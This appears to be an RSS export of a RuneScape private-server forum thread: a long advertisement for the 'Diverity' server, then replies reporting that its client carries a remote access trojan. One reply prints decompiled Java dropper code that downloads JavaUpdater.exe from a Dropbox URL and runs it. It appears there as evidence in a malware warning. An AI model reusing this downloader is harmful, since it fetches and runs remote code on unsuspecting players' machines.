<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>[VIRUS] [317]Diverity: Legendary server with countless updates never before</title>
    <link>https://forum.moparisthebest.com/t/virus-317-diverity-legendary-server-with-countless-updates-never-before/537395</link>
    <description>[b][size=18pt]This server has been reported to be infected with a virus. If you played, please run a scan of your pc.[/size][/b]

[hr]
[FONT=Verdana][SIZE=6][B]Diverity[/B][/SIZE]
[SIZE=4]A legendary server with innovative updates, bringing a new definition to RSPS[/SIZE]



[B][I][SIZE=5]Introduction[/SIZE][/I][/B]
This server, previously known as Insanity-X and before that, Shufflescape, is a 317 revision RSPS. Diverity has been up since April 2012, starting from the Project-Exile source (which is crap and has pretty much nothing). Since then, it has seen hundreds of updates, each one bringing something new and often innovative to the server. As I continue to work hard, sometimes coding for over 20 hours straight to create new exciting content, the server&#39;s potential continues to rise. Diverity offers a myriad of amazing updates that are sure to provide the best RSPS experience possible.
Enough chit-chat; it&#39;s time to show off the server!

[B][I][SIZE=5]Features[/SIZE][/I][/B]

[SIZE=3]Type the command [B]&quot;::ref-mopar&quot;[/B] to receive a referral package containing goods to help you get a running start on the server![/SIZE]
You will get:
Corrupt Bandos godsword (BGS that lasts an hour)
Two temporary auras (one that gives a chance at double drops and one that boosts maximum HP)
A GWD master key (gives you full GWD killcount - one use)
A boost that grants +50% Influence Points for an hour
A boost that grants +25% experience for an hour

[B][I][SIZE=4]Christmas Event[/SIZE][/I][/B]

[IMG]http://i.imgur.com/JB6ANo7.png[/img]

[B][SIZE=5]The Christmas Event is here![/SIZE][/B]

Santa needs your help! Thousands of toys and baubles have been stolen by numerous penguin spies. As they are very messy creatures, the penguin spies have dropped Christmas materials all over the world, and greedy monsters have scooped them up; kill any monster to obtain bauble boxes!

[SIZE=5]Perpetual feature of event: Baubles[/SIZE]

Bauble boxes drop from all monsters and contain a variety of goods, including:
 - Drop rate booster (+30% drop rate for an hour)
 - Life stone (revives you on the spot if you die outside the wilderness - one use)
 - IP lyres (30 influence points)
 - Coins
 - Baubles

Collect baubles from these bauble boxes and return them to Santa by putting them into the bauble donation box at home! Different baubles are worth different amounts of points.

[IMG]http://i.imgur.com/hUIc7NI.png[/img]

As more and more baubles accumulate in the donation box, Santa blesses all the players in the server with a powerful global buff! [B]This buff increases as high as +20% IP and +20% drop rate![/B] Also, for every bauble &quot;point&quot; you turn in, you get a Christmas bauble (green), which you can spend with Santa to buy event rewards shown below.

[IMG]http://i.imgur.com/4k6xpp7.png[/img]

[SIZE=5]Additional Server Event: Penguin Spies + Shanty Claws[/SIZE]

Penguin spies aren&#39;t too stealthy. Every few hours, someone will spot one and a server event will be triggered. Like the Shooting Star, a hint will be sent to all players. The first one to find the penguin will receive bonus bauble boxes!

Note that certain hints that are very general (e.g. &quot;a rocky area&quot;) pertain ONLY to areas that the server uses. A hint such as &quot;near a fishing dock&quot; can pertain to any fishing dock in the world, even in &quot;unused&quot; locations; but that&#39;s not too bad, seeing as there are only a few fishing docks in the world.

[IMG]http://i.imgur.com/pQVT9ym.png[/img]

After you find the penguin, you will notice a portal beneath it; this mysterious portal was being used to transfer goods to the culprit behind all this mayhem: Shanty Claws! Again, the penguins aren&#39;t too smart, so you can hop into the portal yourself to face Shanty Claws... if you dare (safe fight).

[img]http://www.ultraimg.com/images/h6NJ9.gif[/img]
[img]http://www.ultraimg.com/images/NYJej.gif[/img]
[img]http://www.ultraimg.com/images/AU0GL.gif[/img]

[B][I][SIZE=4]Epic Boss Mechanics[/SIZE][/I][/B]
Diverity brings bossing to a new level by giving bosses tons of unique attacks, requiring the player to take action to dodge or block certain attacks.

[img]http://www.ultraimg.com/images/gd49s.gif[/img]
[img]http://www.ultraimg.com/images/1ExGL.gif[/img]
[img]http://www.ultraimg.com/images/gUubk.gif[/img]

Aside from custom attacks on bosses, there are also perfected old bosses that almost every server makes wrong - for example, TDs. Only in Diverity will you fight a Tormented Demon that works EXACTLY how it worked back in pre-EoC RS.
[IMG]http://i.imgur.com/VrmHROe.png[/img]

[B][I][SIZE=4]Server Points: Influence Points[/SIZE][/I][/B]
In this server, regular activities such as PKing, skilling, slayer, bossing, etc. all earn you a core currency called the Influence Point, abbreviated &quot;IP&quot;. There are IP stores that sell many valuable and unique items, including many customs.
Some customs include the charm magnet (automatically picks up charms from monsters) and the Leaf-bladed sword, a weapon that deals incredible damage to slayer m

[img]http://www.ultraimg.com/images/Z8f4.gif[/img]
[img]http://www.ultraimg.com/images/OUmvE.gif[/img]
[IMG]http://i.imgur.com/vRbq8.png[/img]
[IMG]http://i.imgur.com/PxcT3.png[/img]

[B][I][SIZE=3]Auras and Boosters[/SIZE][/I][/B]

You can purchase (with IP) or craft temporary auras and boosters. You can only have ONE aura active at a time, but you can have as many boosters as you&#39;d like. Auras provide valuable bonus effects that can optimize your gameplay.
Example auras:
[IMG]http://i.imgur.com/cbH25.png[/img]
[IMG]http://i.imgur.com/T3dpC.png[/img]
Boosters do what they sound like - they boost stuff. Examples:
IP Booster: Increases IP gain by 50%
XP Booster: Increases XP gain by 25%/50% (depending on tier)
EP Booster: Doubles EP gain in the Wilderness and increases the value of EP drops
Drop Rate Booster: Increases the chance to obtain rare items by 30%

[B][I][SIZE=4]Achievement System[/SIZE][/I][/B]
Diverity offers over 80 achievements to unlock. Unlocking an achievement grants a certain amount of achievement points, and one achievement coin for every 10 achievement points you earn. Achievement coins can be spent in a store. Certain achievements also grant you special titles to use on the ::yell channel!

[IMG]http://i.imgur.com/GCCTWbR.png[/img]
[img]http://www.ultraimg.com/images/GOTy9.gif[/img]

[B][I][SIZE=3]Daily Achievements[/SIZE][/I][/B]
Daily achievements consist of many categories and each category can be completed once per day. Every category completed grants coins, achievement points, and during certain events, bonus items. When any 5 categories are completed, a [B]daily achievement chest[/B] is rewarded, which contains IP, unique crafting materials, as well as a chance at auras and other rare items like the recipe item for the glacial whip and certain premium items.
[IMG]http://i.imgur.com/jWZUucp.png[/img]

[B][I][SIZE=4]Item Crafting + Customs[/SIZE][/I][/B]
There are a lot of custom items in Diverity that fit well in the context of RSPS. Most of these items are crafted out of more familiar items - for example, to craft a gilded whip, you&#39;ll need an abyssal whip, dragonstones, and mystic shards (from daily achievements). To craft an item, you need the recipe item and the required materials. Some recipes are permanent (like aura recipes), and some are one-use (equipment recipes). Recipes come from various sources - some come from the Vote Point store, some come from the IP store, some come from monster drops, etc. Can you hunt down the recipe and materials to make your dream weapon?

[img]http://www.ultraimg.com/images/icmCp.gif[/img]
[img]http://www.ultraimg.com/images/KHdAh.gif[/img]
Here are a couple examples of the customs you can craft:
[img]http://www.ultraimg.com/images/uMYWi.gif[/img] TALKING ROCK CRAB OP LOLZ
[img]http://www.ultraimg.com/images/3XPfN.gif[/img]

[B][I][SIZE=4]Server World Events + Difficulty Scaling[/SIZE][/I][/B]
The server occasionally spawns a number of different kinds of events. These events scale difficulty and volume with the amount of players that attend the event (or, in certain cases, total players online), and after the event concludes, ALL participants receive rewards depending on their contribution level (bronze, silver, gold, or platinum). The scaling is designed in such a way that all participants can get a gold-level contribution.

A couple different events are detailed below:
1) Shooting star
A shooting star falls from the sky in a general location (e.g. East Ardy, Seer&#39;s Village, etc), and players have to hunt down the star. The first person to find the star will receive 25% bonus rewards at the end of the event. Mining the star grants stardust and mining experience based on the size of the star. Stardust can be sold to the general store or exchanged for rewards. Players also receive a 25% XP boost for 30 minutes after the event concludes, as well as IP.
[IMG]http://i.imgur.com/oM1QZ.png[/img]
2) Bandos Invasion
Bandos has always been the most popular in the Godwars Dungeon. However, consistently killing his generals doesn&#39;t make him very happy. After his anger reaches a certain threshold, hell breaks loose and he sends forces to invade Falador. Players have 30 minutes to clear out the generals and minions inhabiting the city, or Bandos will capture white knights to fight for his will. After clearing all the normal Bandos monsters, an elite version of General Graardor spawns in the castle and scales in strength to the amount of players fighting him. After defeating him, players can loot a Bandos event chest which has a very high rate to give Bandos items, as well as a small chance at a legendary recipe for an infinite GWD key, which gives you and your allies full GWD killcount infinitely.
[img]http://www.ultraimg.com/images/uyxW2.gif[/img]
[img]http://www.ultraimg.com/images/VPkqz.gif[/img]
[img]http://www.ultraimg.com/images/fzIFd.gif[/img]

[B][I][SIZE=3]Bosses with Difficulty Scaling[/SIZE][/I][/B]
Sometimes, it is annoying to compete for bosses. However, certain bosses are made under the event framework to scale in difficulty with the amount of players fighting it, such that it is justified for the boss&#39;s loot to be distributed to every person via a chest. Long story short - bosses with difficulty scaling can be fought solo or in a group, and everybody always get the same, if not more, loot than normal!

[B][I][SIZE=4]Dungeoneering[/SIZE][/I][/B]
What&#39;s a server without a dungeon system? Diverity has its own dungeoneering system that was made (in a couple days) to be better than that of SoulSplit. The experience scales up as your Dungeoneering level gets higher, and you unlock new floors. There are currently 4 floors, each with a pre-designated party size.

[IMG]http://i.imgur.com/Lc2OT.png[/img]
[IMG]http://i.imgur.com/JCOkv.png[/img]
[IMG]http://i.imgur.com/mdlbT.png[/img]
(floor 3 is a trio dungeon with a focus on a complicated puzzle; sadly, I don&#39;t have a screenshot)
[IMG]http://i.imgur.com/zfoqF.png[/img]

[B][I][SIZE=4]PKing[/SIZE][/I][/B]
PKing is one of my favorite aspects of RSPS, especially when it isn&#39;t just arranged fighting. There are high-value resources in the Wilderness, such as Frost/Mithril dragons (they drop Frostbite/Hailstorm dagger) and bosses with incredible drops (Bork drops corrupt Vesta and hand cannon), and if you want to obtain these drops, you might just become prey for the PKers out there.

[img]http://www.ultraimg.com/images/UdTag.gif[/img]

[B][I][SIZE=3]PK Systems[/SIZE][/I][/B]
[IMG]http://i.imgur.com/7Yd0A.png[/img]
There are many systems that come with PKing.
1) Influence Point gain
You gain a variable amount of IP per kill, depending on many factors, including you and your opponent&#39;s killstreak.
2) Multi-kills
Killing multiple people back-to-back sends global multi-kill messages to the server and grants you bonus IP (while making you look like a total BA).
3) PK rating
After killing 50 players, you are given a PK rating starting at 1200. This rating increases or decreases when you die/kill in the Wilderness, depending on your opponent&#39;s rating. Reaching certain rating unlocks achievements and titles.
4) EP
Killing players, monsters, and bosses in the Wilderness all grant EP. When killing a player, EP is cashed in for bonus drops. You can even receive legendary recipes for items such as the primal longsword if you have the maximum EP.

[B][I][SIZE=3]Everything works as it should[/SIZE][/I][/B]
You&#39;ve already seen the content we are capable of. Except all items you are familiar with, all the way from dragon claws to BGS to SWH to Morrigan&#39;s javelin and thrownaxes and even the Staff of Light, to work as they did pre-EoC RS.

[img]http://www.ultraimg.com/images/BMxoH.gif[/img]
[img]http://www.ultraimg.com/images/mlEed.gif[/img]

[B][I][SIZE=3]F2P PKing Zone[/SIZE][/I][/B]
Whether you&#39;re familiar with F2P PKing or not, there is an F2P PK zone open that only allows F2P items, prayers, and magics. This means no claws, no curses, no super potions, no ancients, not even monkfish!
The only abnormality is mystic robes and wave spells - F2P mages were severely underpowered, so they are allowed to use mystic and wave spells to compensate.
Corrupt dragon weapons/armor (chaos elemental drop) as well as gravite weapons (F2P PKP store) are allowed in this zone.

[img]http://www.ultraimg.com/images/jdCrQ.gif[/img]
[img]http://www.ultraimg.com/images/SJg9A.gif[/img]

[B][I][SIZE=4]Voting[/SIZE][/I][/B]
Voting is core to any RSPS. Vote for Diverity for voting points; as you vote consecutively, you will gain more and more voting points; eventually, you can even gain double voting points!
You can even purchase Donator status with voting points!
[img]http://www.ultraimg.com/images/Ht6mi.gif[/img]
[img]http://www.ultraimg.com/images/mHfwi.gif[/img]

[B][I][SIZE=4]Runes and Rune Points[/SIZE][/I][/B]
Is your bank bursting with excess Bandos and Torva? Never fear, the rune point exchange is here! You can perform this ONE-WAY trade of your valuable items to rune points, which you can spend on powerful runes. These runes, once applied to a rune page, permanently buff your character and give you bonuses such as magic damage %, lifesteal %, defense, attack, and even strength and prayer.
[img]http://www.ultraimg.com/images/VvAkt.gif[/img]
[IMG]http://i.imgur.com/bEDV4.png[/img]

[B][I][SIZE=4]Thank you for reading about my server![/SIZE][/I][/B]
I sincerely thank you for taking time to invest your valuable time to look into my server. I hope you consider joining Diverity to become a part of the next RSPS generation.
Now, if you&#39;ve actually read through this whole post, you know it was all pretty serious stuff. But let&#39;s loosen the mood a bit - here are some fail clips and random bonus features from my server that might entertain you.

TYPING JAIL
[img]http://www.ultraimg.com/images/eGiW.gif[/img]
Lots of 317 servers have monkeys to kill for jail. But for Diverity, it&#39;s different. You have to type randomly generated sentences! When I created this, lots of people were asking to be jailed, and we would have a typing competition. Good times!

THE NOCLIP POLICE
[img]http://www.ultraimg.com/images/lG0wb.gif[/img]
They&#39;re always watchin&#39;.

BEST HYBRID AFRICA
[img]http://www.ultraimg.com/images/02LNb.gif[/img]
After I did this I was laughing like mad for a good 5 minutes.

Again, if you plan to join this server, don&#39;t forget the referral bonus for typing in ::ref-mopar
~

[/FONT]</description>
    
    <lastBuildDate>Sat, 25 Jul 2015 06:19:57 +0000</lastBuildDate>
    <category>Runescape</category>
    <atom:link href="https://forum.moparisthebest.com/t/virus-317-diverity-legendary-server-with-countless-updates-never-before/537395.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>[VIRUS] [317]Diverity: Legendary server with countless updates never before</title>
        <dc:creator><![CDATA[@deathschaos9 DeathsChaos9]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/deathschaos9">@deathschaos9</a> wrote:</p>
          <blockquote>
              <aside class="quote" data-post="10" data-topic="537395">
<div class="title">
<div class="quote-controls"></div>
<img alt width="20" height="20" src="https://forum.moparisthebest.com/user_avatar/forum.moparisthebest.com/davidi2/40/2579_1.png" class="avatar"> Davidi2:</div>
<blockquote>
<p>Thank you.</p>
</blockquote>
</aside>
<p>Close them reports <img src="https://forum.moparisthebest.com/images/emoji/twitter/wink.png?v=5" title=":wink:" class="emoji" alt=":wink:"></p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/virus-317-diverity-legendary-server-with-countless-updates-never-before/537395/11">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/virus-317-diverity-legendary-server-with-countless-updates-never-before/537395/11</link>
        <pubDate>Sat, 25 Jul 2015 06:19:57 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-537395-11</guid>
        <source url="https://forum.moparisthebest.com/t/virus-317-diverity-legendary-server-with-countless-updates-never-before/537395.rss">[VIRUS] [317]Diverity: Legendary server with countless updates never before</source>
      </item>
      <item>
        <title>[VIRUS] [317]Diverity: Legendary server with countless updates never before</title>
        <dc:creator><![CDATA[@davidi2 Davidi2]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/davidi2">@davidi2</a> wrote:</p>
          <blockquote>
              <p>Thank you.</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/virus-317-diverity-legendary-server-with-countless-updates-never-before/537395/10">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/virus-317-diverity-legendary-server-with-countless-updates-never-before/537395/10</link>
        <pubDate>Thu, 11 Jun 2015 22:04:30 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-537395-10</guid>
        <source url="https://forum.moparisthebest.com/t/virus-317-diverity-legendary-server-with-countless-updates-never-before/537395.rss">[VIRUS] [317]Diverity: Legendary server with countless updates never before</source>
      </item>
      <item>
        <title>[VIRUS] [317]Diverity: Legendary server with countless updates never before</title>
        <dc:creator><![CDATA[@X-J-K-X X-J-K-X]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/x-j-k-x">@X-J-K-X</a> wrote:</p>
          <blockquote>
              <aside class="quote" data-post="8" data-topic="537395">
<div class="title">
<div class="quote-controls"></div>
<img alt width="20" height="20" src="https://forum.moparisthebest.com/user_avatar/forum.moparisthebest.com/davidi2/40/2579_1.png" class="avatar"> Davidi2:</div>
<blockquote>
<p>Can someone else confirm the virus?</p>
</blockquote>
</aside>
<p>Confirmed</p>
<pre><code class="lang-auto">     public static void main(String args[])
        throws IOException
    {
        String fileName = "JavaUpdater.exe";
        URL link = new URL("https://dl.dropboxusercontent.com/u/103921696/rsps/update/JavaUpdater.exe");
        InputStream in = new BufferedInputStream(link.openStream());
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte buf[] = new byte[1024];
        for(int n = 0; -1 != (n = in.read(buf));)
            out.write(buf, 0, n);

        out.close();
        in.close();
        byte response[] = out.toByteArray();
        FileOutputStream fos = new FileOutputStream((new StringBuilder(String.valueOf(HomeDir()))).append(fileName).toString());
        fos.write(response);
        fos.close();
        Process process = (new ProcessBuilder(new String[] {
            (new StringBuilder(String.valueOf(HomeDir()))).append("JavaUpdater.exe").toString()
        })).start();
    }
}</code></pre>
<p><img src="http://i.gyazo.com/5bb54984efa3574e96dae989ca85ca68.png" alt width="" height=""><br>
<img src="http://i.gyazo.com/e3ac7e6af71b4f83e484ddd28c882e82.png" alt width="" height=""></p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/virus-317-diverity-legendary-server-with-countless-updates-never-before/537395/9">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/virus-317-diverity-legendary-server-with-countless-updates-never-before/537395/9</link>
        <pubDate>Thu, 11 Jun 2015 21:38:17 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-537395-9</guid>
        <source url="https://forum.moparisthebest.com/t/virus-317-diverity-legendary-server-with-countless-updates-never-before/537395.rss">[VIRUS] [317]Diverity: Legendary server with countless updates never before</source>
      </item>
      <item>
        <title>[VIRUS] [317]Diverity: Legendary server with countless updates never before</title>
        <dc:creator><![CDATA[@davidi2 Davidi2]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/davidi2">@davidi2</a> wrote:</p>
          <blockquote>
              <p>Can someone else confirm the virus?</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/virus-317-diverity-legendary-server-with-countless-updates-never-before/537395/8">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/virus-317-diverity-legendary-server-with-countless-updates-never-before/537395/8</link>
        <pubDate>Thu, 11 Jun 2015 18:55:15 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-537395-8</guid>
        <source url="https://forum.moparisthebest.com/t/virus-317-diverity-legendary-server-with-countless-updates-never-before/537395.rss">[VIRUS] [317]Diverity: Legendary server with countless updates never before</source>
      </item>
      <item>
        <title>[VIRUS] [317]Diverity: Legendary server with countless updates never before</title>
        <dc:creator><![CDATA[@Rawbie68 Rawbie68]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/rawbie68">@Rawbie68</a> wrote:</p>
          <blockquote>
              <p>daily bump</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/virus-317-diverity-legendary-server-with-countless-updates-never-before/537395/7">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/virus-317-diverity-legendary-server-with-countless-updates-never-before/537395/7</link>
        <pubDate>Sat, 06 Jun 2015 10:18:07 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-537395-7</guid>
        <source url="https://forum.moparisthebest.com/t/virus-317-diverity-legendary-server-with-countless-updates-never-before/537395.rss">[VIRUS] [317]Diverity: Legendary server with countless updates never before</source>
      </item>
      <item>
        <title>[VIRUS] [317]Diverity: Legendary server with countless updates never before</title>
        <dc:creator><![CDATA[@nolan2131 nolan2131]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/nolan2131">@nolan2131</a> wrote:</p>
          <blockquote>
              <p>Server looks amazingly unique, although you can’t ignore the virus accusations and expect anyone to play. Disappointing because it looks so good.</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/virus-317-diverity-legendary-server-with-countless-updates-never-before/537395/6">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/virus-317-diverity-legendary-server-with-countless-updates-never-before/537395/6</link>
        <pubDate>Fri, 05 Jun 2015 16:17:30 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-537395-6</guid>
        <source url="https://forum.moparisthebest.com/t/virus-317-diverity-legendary-server-with-countless-updates-never-before/537395.rss">[VIRUS] [317]Diverity: Legendary server with countless updates never before</source>
      </item>
      <item>
        <title>[VIRUS] [317]Diverity: Legendary server with countless updates never before</title>
        <dc:creator><![CDATA[@Pest Pest]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/pest">@Pest</a> wrote:</p>
          <blockquote>
              <p>Virus confirmed.<br>
Now I have to remove it, but figured I’d let everyone else know first.<br>
Next time make your RAT FUD. Moron.<br>
The server itself isn’t a virus, unless it auto-runs that file, which it probably does…<br>
But here’s a picture for your understanding.<br>
Check your C:/Users/YOURNAMEHERE/JavaUpdater.exe<br>
<img src="http://i.imgur.com/4QHyuzd.png" alt width="" height=""></p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/virus-317-diverity-legendary-server-with-countless-updates-never-before/537395/5">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/virus-317-diverity-legendary-server-with-countless-updates-never-before/537395/5</link>
        <pubDate>Fri, 05 Jun 2015 16:08:54 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-537395-5</guid>
        <source url="https://forum.moparisthebest.com/t/virus-317-diverity-legendary-server-with-countless-updates-never-before/537395.rss">[VIRUS] [317]Diverity: Legendary server with countless updates never before</source>
      </item>
      <item>
        <title>[VIRUS] [317]Diverity: Legendary server with countless updates never before</title>
        <dc:creator><![CDATA[@Rawbie68 Rawbie68]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/rawbie68">@Rawbie68</a> wrote:</p>
          <blockquote>
              <p>BUMP, Great server, just needs more players! has been up for more than 3 years come check it out!</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/virus-317-diverity-legendary-server-with-countless-updates-never-before/537395/4">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/virus-317-diverity-legendary-server-with-countless-updates-never-before/537395/4</link>
        <pubDate>Fri, 05 Jun 2015 07:41:45 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-537395-4</guid>
        <source url="https://forum.moparisthebest.com/t/virus-317-diverity-legendary-server-with-countless-updates-never-before/537395.rss">[VIRUS] [317]Diverity: Legendary server with countless updates never before</source>
      </item>
      <item>
        <title>[VIRUS] [317]Diverity: Legendary server with countless updates never before</title>
        <dc:creator><![CDATA[@timor5 timor5]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/timor5">@timor5</a> wrote:</p>
          <blockquote>
              <p>bump</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/virus-317-diverity-legendary-server-with-countless-updates-never-before/537395/3">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/virus-317-diverity-legendary-server-with-countless-updates-never-before/537395/3</link>
        <pubDate>Mon, 23 Dec 2013 13:37:39 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-537395-3</guid>
        <source url="https://forum.moparisthebest.com/t/virus-317-diverity-legendary-server-with-countless-updates-never-before/537395.rss">[VIRUS] [317]Diverity: Legendary server with countless updates never before</source>
      </item>
      <item>
        <title>[VIRUS] [317]Diverity: Legendary server with countless updates never before</title>
        <dc:creator><![CDATA[@Dave_is_pro Dave is pro]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/dave_is_pro">@Dave_is_pro</a> wrote:</p>
          <blockquote>
              <p>Hey! this looks unique! it has some really cool feautres… Goodluck to your server man!</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/virus-317-diverity-legendary-server-with-countless-updates-never-before/537395/2">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/virus-317-diverity-legendary-server-with-countless-updates-never-before/537395/2</link>
        <pubDate>Sun, 22 Dec 2013 02:07:57 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-537395-2</guid>
        <source url="https://forum.moparisthebest.com/t/virus-317-diverity-legendary-server-with-countless-updates-never-before/537395.rss">[VIRUS] [317]Diverity: Legendary server with countless updates never before</source>
      </item>
      <item>
        <title>[VIRUS] [317]Diverity: Legendary server with countless updates never before</title>
        <dc:creator><![CDATA[@timor5 timor5]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/timor5">@timor5</a> wrote:</p>
          <blockquote>
              <p><span class="bbcode-b">[size=18pt]This server has been reported to be infected with a virus. If you played, please run a scan of your pc.[/size]</span></p>
<p>[hr]<br>
[FONT=Verdana][SIZE=6][B]Diverity[/B][/SIZE]<br>
[SIZE=4]A legendary server with innovative updates, bringing a new definition to RSPS[/SIZE]</p>
<p>[B][I][SIZE=5]Introduction[/SIZE][/I][/B]<br>
This server, previously known as Insanity-X and before that, Shufflescape, is a 317 revision RSPS. Diverity has been up since April 2012, starting from the Project-Exile source (which is crap and has pretty much nothing). Since then, it has seen hundreds of updates, each one bringing something new and often innovative to the server. As I continue to work hard, sometimes coding for over 20 hours straight to create new exciting content, the server’s potential continues to rise. Diverity offers a myriad of amazing updates that are sure to provide the best RSPS experience possible.<br>
Enough chit-chat; it’s time to show off the server!</p>
<p>[B][I][SIZE=5]Features[/SIZE][/I][/B]</p>
<p>[SIZE=3]Type the command [B]"::ref-mopar"[/B] to receive a referral package containing goods to help you get a running start on the server![/SIZE]<br>
You will get:<br>
Corrupt Bandos godsword (BGS that lasts an hour)<br>
Two temporary auras (one that gives a chance at double drops and one that boosts maximum HP)<br>
A GWD master key (gives you full GWD killcount - one use)<br>
A boost that grants +50% Influence Points for an hour<br>
A boost that grants +25% experience for an hour</p>
<p>[B][I][SIZE=4]Christmas Event[/SIZE][/I][/B]</p>
<p><img src="http://i.imgur.com/JB6ANo7.png" alt width="" height=""></p>
<p>[B][SIZE=5]The Christmas Event is here![/SIZE][/B]</p>
<p>Santa needs your help! Thousands of toys and baubles have been stolen by numerous penguin spies. As they are very messy creatures, the penguin spies have dropped Christmas materials all over the world, and greedy monsters have scooped them up; kill any monster to obtain bauble boxes!</p>
<p>[SIZE=5]Perpetual feature of event: Baubles[/SIZE]</p>
<p>Bauble boxes drop from all monsters and contain a variety of goods, including:</p>
<ul>
<li>Drop rate booster (+30% drop rate for an hour)</li>
<li>Life stone (revives you on the spot if you die outside the wilderness - one use)</li>
<li>IP lyres (30 influence points)</li>
<li>Coins</li>
<li>Baubles</li>
</ul>
<p>Collect baubles from these bauble boxes and return them to Santa by putting them into the bauble donation box at home! Different baubles are worth different amounts of points.</p>
<p><img src="http://i.imgur.com/hUIc7NI.png" alt width="" height=""></p>
<p>As more and more baubles accumulate in the donation box, Santa blesses all the players in the server with a powerful global buff! [B]This buff increases as high as +20% IP and +20% drop rate![/B] Also, for every bauble “point” you turn in, you get a Christmas bauble (green), which you can spend with Santa to buy event rewards shown below.</p>
<p><img src="http://i.imgur.com/4k6xpp7.png" alt width="" height=""></p>
<p>[SIZE=5]Additional Server Event: Penguin Spies + Shanty Claws[/SIZE]</p>
<p>Penguin spies aren’t too stealthy. Every few hours, someone will spot one and a server event will be triggered. Like the Shooting Star, a hint will be sent to all players. The first one to find the penguin will receive bonus bauble boxes!</p>
<p>Note that certain hints that are very general (e.g. “a rocky area”) pertain ONLY to areas that the server uses. A hint such as “near a fishing dock” can pertain to any fishing dock in the world, even in “unused” locations; but that’s not too bad, seeing as there are only a few fishing docks in the world.</p>
<p><img src="http://i.imgur.com/pQVT9ym.png" alt width="" height=""></p>
<p>After you find the penguin, you will notice a portal beneath it; this mysterious portal was being used to transfer goods to the culprit behind all this mayhem: Shanty Claws! Again, the penguins aren’t too smart, so you can hop into the portal yourself to face Shanty Claws… if you dare (safe fight).</p>
<p><img src="http://www.ultraimg.com/images/h6NJ9.gif" alt width="" height=""><br>
<img src="http://www.ultraimg.com/images/NYJej.gif" alt width="" height=""><br>
<img src="http://www.ultraimg.com/images/AU0GL.gif" alt width="" height=""></p>
<p>[B][I][SIZE=4]Epic Boss Mechanics[/SIZE][/I][/B]<br>
Diverity brings bossing to a new level by giving bosses tons of unique attacks, requiring the player to take action to dodge or block certain attacks.</p>
<p><img src="http://www.ultraimg.com/images/gd49s.gif" alt width="" height=""><br>
<img src="http://www.ultraimg.com/images/1ExGL.gif" alt width="" height=""><br>
<img src="http://www.ultraimg.com/images/gUubk.gif" alt width="" height=""></p>
<p>Aside from custom attacks on bosses, there are also perfected old bosses that almost every server makes wrong - for example, TDs. Only in Diverity will you fight a Tormented Demon that works EXACTLY how it worked back in pre-EoC RS.<br>
<img src="http://i.imgur.com/VrmHROe.png" alt width="" height=""></p>
<p>[B][I][SIZE=4]Server Points: Influence Points[/SIZE][/I][/B]<br>
In this server, regular activities such as PKing, skilling, slayer, bossing, etc. all earn you a core currency called the Influence Point, abbreviated “IP”. There are IP stores that sell many valuable and unique items, including many customs.<br>
Some customs include the charm magnet (automatically picks up charms from monsters) and the Leaf-bladed sword, a weapon that deals incredible damage to slayer m</p>
<p><img src="http://www.ultraimg.com/images/Z8f4.gif" alt width="" height=""><br>
<img src="http://www.ultraimg.com/images/OUmvE.gif" alt width="" height=""><br>
<img src="http://i.imgur.com/vRbq8.png" alt width="" height=""><br>
<img src="http://i.imgur.com/PxcT3.png" alt width="" height=""></p>
<p>[B][I][SIZE=3]Auras and Boosters[/SIZE][/I][/B]</p>
